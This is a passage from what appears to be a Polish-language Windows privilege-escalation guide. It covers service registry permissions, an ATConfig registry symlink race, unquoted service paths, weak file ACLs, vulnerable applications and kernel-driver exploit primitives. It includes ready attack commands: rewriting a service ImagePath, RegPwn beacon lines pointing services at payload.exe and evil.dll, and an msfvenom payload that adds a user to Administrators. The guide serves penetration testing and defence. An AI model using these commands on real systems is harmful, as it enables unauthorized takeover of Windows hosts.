> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma skonfigurowaną akcję ponownego uruchomienia po awarii lub może zostać pośrednio uruchomiona przez korzystającą z niej aplikację.

### Uprawnienia do modyfikowania kluczy rejestru usług

Sprawdź, czy możesz modyfikować klucze rejestru usług.\
Możesz **sprawdzić** swoje **uprawnienia** do **klucza rejestru** usługi, wykonując:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w kluczu rejestru danej usługi. Sam wpis ACL nie dowodzi, że dostęp jest faktycznie możliwy — znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` obiektu usługi. Eskalacja wymaga również użytecznego pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz [uprawnienia do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) firmy Microsoft oraz [zestawienie uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do uruchamianego pliku binarnego:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig symlinków rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig symlinków** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, dając możliwość **zapisu dowolnej wartości** HKLM.<sup>[[18]](#references)</sup>

Kluczowe lokalizacje (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejść do bezpiecznego pulpitu i jest zapisywalny przez użytkownika.

Przebieg nadużycia (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą SYSTEM ma zapisać.
2. Wywołaj kopiowanie na bezpieczny pulpit (np. **LockWorkstation**), co uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy zadziała oplock, zastąp klucz **HKLM Session ATConfig** **linkiem rejestru** prowadzącym do chronionego celu HKLM.
4. SYSTEM zapisze wartość wybraną przez atakującego w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM wykonaj pivot do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz takie uprawnienia do rejestru, oznacza to, że **możesz tworzyć w nim podrejestry**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdy jej fragment kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wymień wszystkie nieujęte w cudzysłowy ścieżki usług, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć binarny plik usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania odzyskiwania

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Pliki skryptów wskazywane przez zaplanowane zadania

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź zarówno skrypt wskazany w **argumentach akcji**, jak i `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak `-File` w PowerShellu. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShella z `-File`, sprawdź również ACL wskazanego skryptu; zmienne, warunki i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący ma prawo zapisu, stanowi potencjalną ścieżkę do wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowany podmiot zabezpieczeń zadania różni się od konta wywołującego, a zadanie rzeczywiście dochodzi do tej akcji. ACL pozwalający wyłącznie na dopisywanie danych może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane linie nie zostaną wykonane. Zanim stwierdzisz możliwość eskalacji uprawnień, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W systemie plików NTFS plik z prawem odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna w zwykłym widoku katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych sprawdź **nazwy i rozmiary** strumieni, zanim otworzysz ich zawartość. Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz polecenia PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu jest jedynie wskazówką. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie się uwierzytelniają. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit uruchamianego przez zaplanowane zadanie

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` i plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiająca ten pomocnik z kontem o wysokich uprawnieniach może umożliwić wykonanie poleceń w kontekście tego konta poprzez dostęp do zapisu o niskich uprawnieniach do tych plików wejściowych, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że proces o wysokich uprawnieniach korzysta z tych plików oraz że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie pomocnika nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) i ACL obu ścieżek do plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest jedynie wskazówką do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje pliki wejściowe. Musi być również spełniony wymóg dotyczący pliku roboczego projektu. Sprawdź rzeczywisty podmiot zabezpieczeń zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może można podmienić jeden z nich i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk dla Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — uruchamiały istniejący, chroniony przed zapisem plik. Dostawca naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny zainstalowany poziom poprawek oraz to, czy można uruchomić podatną operację agenta; sama etykieta gałęzi, taka jak `2.1`, nie pozwala ustalić, czy system jest podatny. Enumeracja może sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani wywoływania poleceń agenta.

#### Weryfikacja usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło kompilacji ADSelfService Plus 6210 i wcześniejszych; dostawca naprawił problem w kompilacji 6211. Ma to znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu przez usługę odbywa się z uprawnieniami tego konta; uruchomienie kodu jako SYSTEM wymaga instancji działającej jako SYSTEM. Czytelny plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępność użytecznych poświadczeń ani na tę lukę SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i uprawnienia dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins działającym w systemie Windows odróżnij uprawnienie do utworzenia lub skonfigurowania zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako odrębne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalne wyzwalanie mogą umożliwić uruchomienie kompilacji inną drogą, ale sprawdź, czy są włączone i czy kompilacja rzeczywiście działa. Kod jest wykonywany z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie może być użyte tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane poświadczeń i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; sprawdź **uprawnienia odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we współdzielonym wyniku. Jeśli to konto ma uprawnienie zapisu do `scriptPath` obiektu użytkownika AD, przed uznaniem tego za możliwość wykonania kodu w kontekście innego użytkownika sprawdź, czy ścieżka skryptu jest zapisywalna oraz czy istnieje rzeczywisty proces logowania lub zaplanowane zadanie działające jako użytkownik docelowy. Dalsza kontrola grup wymaga osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta Azure Pipelines self-hosted

W przypadku Azure DevOps Server lub projektu Azure Pipelines odróżnij uprawnienie do **utworzenia lub edycji** pipeline od uprawnienia do jego **umieszczenia w kolejce** i użycia wybranej puli agentów; [Microsoft opisuje uprawnienia do pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) osobno. Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić ten pipeline na agencie self-hosted dla Windows, krok jest wykonywany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Przed stwierdzeniem, że możliwe jest przejście między użytkownikami lub uzyskanie uprawnień SYSTEM, sprawdź dokładny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie gotowe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub uprawnienie zapisu do repozytorium to jedynie wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa o nazwie sugerującej uprawnienia administratora lokalnego lub widoczność bazy danych nie dowodzą, że poświadczenie można odszyfrować ani że możliwe jest podniesienie uprawnień w domenie. Osobno sprawdź rzeczywiste uprawnienia odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz jej efektywne uprawnienia AD. Rutynowa enumeracja powinna wyświetlać wyłącznie metadane usługi i dostępu, a nie odpytywać zapisanych sekretów ani ich wypisywać.

#### Uprawnienia do bibliotek DLL obsługujących sterowniki drukarek

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w procesie drukowania o wyższych uprawnieniach. Sprawdź dokładny katalog sterownika i listy ACL bibliotek DLL, w tym katalogi nadrzędne oraz punkty ponownej analizy, nawet jeśli enumeracja WMI drukarek jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) wskazana ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie biblioteki DLL przez `PrintIsolationHost.exe`. Zapis w ACL to jedynie wskazówka: sprawdź efektywne uprawnienia zapisu z uwzględnieniem wpisów odmowy, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości oraz czy dostawca naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczającym. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, albo czy możesz zmodyfikować plik binarny uruchamiany przez konto Administratora (schedtasks).

Słabe uprawnienia do folderów i plików w systemie można znaleźć w następujący sposób:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie wtyczek Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL wtyczek z podfolderów `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna lub kopia, umieszczenie złośliwej wtyczki zapewnia automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (również z `DllMain` i funkcji zwrotnych wtyczki).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś klucz rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnie **podejrzanych/podatnych** sterowników firm trzecich.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli sterownik udostępnia dowolną operację odczytu/zapisu w kernelu (co często zdarza się w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, kradnąc token SYSTEM bezpośrednio z pamięci kernela.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Powiązane materiały dotyczące exploita kernela Windows:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów typu race condition, gdy podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (przez użycie komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do kilkudziesięciu mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF-y w cancel-safe queue, ujawnienia danych z paged pool i pivots przez I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch osobno mało groźnych błędów: **race condition dotyczącego czasu życia cancel-safe queue**, który zwalnia request/CBD, gdy blokada kolejki jest nadal zajęta, oraz ujawnienia **lock-release-before-copy**, które ujawnia zwolnioną alokację paged pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i exploita:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dociera do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` z powrotem do callbacka usuwającego sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy kolejki danych `NPFS` są przydatne, ponieważ można kontrolować ich payload i rozmiar, a później sprawdzać je operacjami odczytu/podglądu pipe'a. Jeśli zwolniony obiekt zawiera linki listy, nadpisz je **cykliczną listą fałszywych węzłów requestów w pamięci user mode**, aby sterownik wielokrotnie przetwarzał zdefiniowane przez atakującego struktury requestów zamiast zakończyć działanie na pierwotnej głowie listy.
- **Rozwiń przewidywalny zapis**: jeśli fałszywy request przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z refcount), możesz uzyskać zapis kernela **z kontrolowanym adresem, ale nie wartością**. W takim przypadku zaatakuj pole **length/size** obiektu ze spryskanego poola zamiast końcowego wskaźnika kodu/danych, a następnie przeszukuj spryskane obiekty, aż uszkodzony obiekt umożliwi odczyt poza zakresem z paged pool.
- **Wzorzec podatnego na race condition ujawnienia danych**: każde wywołanie syscalla wykonujące `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność rośnie, gdy atakujący może zwiększyć rozmiar kopiowanego bufora (na przykład przez dodanie wielu wpisów list/resource zwiększających końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę, niekoniecznie powodując awarię systemu.
- **Cele do uzupełniania poola bogate we wskaźniki**: tablice zarejestrowanych buforów Windows **I/O ring** są doskonałymi celami ujawnienia danych, ponieważ rozmiar ich alokacji paged pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element to wskaźnik kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z fałszywych wpisów przygotowanych przez atakującego i zapewniały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis pozwala ustawić stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby zbudować wskaźnik user mode z powtarzającym się bajtem, na przykład `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam fałszywą tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki diagnostyczne:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu w jądrze za pomocą uszkodzonego I/O ringa, przejmij token SYSTEM, korzystając ze standardowego workflow po uzyskaniu prymitywu:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Prymitywy korupcji pamięci hive rejestru

Współczesne luki w hive pozwalają przygotować deterministyczny układ pamięci, nadużywać zapisywalnych obiektów podrzędnych HKLM/HKU i przekształcać korupcję metadanych w przepełnienia pamięci paged-pool jądra bez niestandardowego sterownika. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie direct funkcji `RtlQueryRegistryValues` przy ścieżkach kontrolowanych przez atakującego

Niektóre sterowniki akceptują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i przekazują wskaźnik do skalarnej zmiennej na stosie, takiej jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane na podstawie **rzeczywistego** typu rejestru, a nie typu oczekiwanego przez programistę.

Daje to dwa przydatne prymitywy:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala sterownikowi odpytywać klucze wybrane przez atakującego, ujawniać ich istnienie przez kody zwrotne/logi, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci jądra**: miejsce docelowe w postaci skalaru, takie jak `&readValue`, może zostać zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Zabezpieczenie w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z jądra kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość wykorzystania luki, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemu**, zamiast umieszczać wartości w `HKCU`.
- **Umieszczanie wartości w zaufanym hive**: użyj NtObjectManager, aby wyliczyć zapisywalne obiekty podrzędne `\Registry\Machine`, a następnie ponów skanowanie z zduplikowanym tokenem o **niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxowych:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacku/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb bezpośredni wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowaną przez atakującego wartość `REG_DWORD` do zmiennej skalarnej na stosie, a następnie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując częściowo kontrolowany zapis w kernelu.
- **`REG_BINARY`**: dla dużych danych binarnych tryb bezpośredni traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej skalarną wartość kontrolowaną przez atakującego i **ujemną**, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich pól na stosie. Często jest to najprostsza droga do pełnego nadpisania wskaźnika callbacku.

Silny wzorzec do wyszukiwania: **niejednorodne odczyty z rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Wyszukuj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używane wskaźniki `EntryContext` oraz ścieżki kodu, w których pierwszy odczyt z rejestru decyduje o wykonaniu drugiego.

#### Wykorzystanie braku FILE_DEVICE_SECURE_OPEN w obiektach urządzeń (LPE + EDR kill)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie otwiera się przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu każdy użytkownik bez uprawnień może uzyskać uchwyt, używając ścieżki przestrzeni nazw, takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może otworzyć urządzenie, może wykorzystać udostępnione przez sterownik uprzywilejowane IOCTL-e do LPE i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenu / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowych danych na dysku (manipulacja w trybie offline, sztuczki z utrwalaniem przy rozruchu).
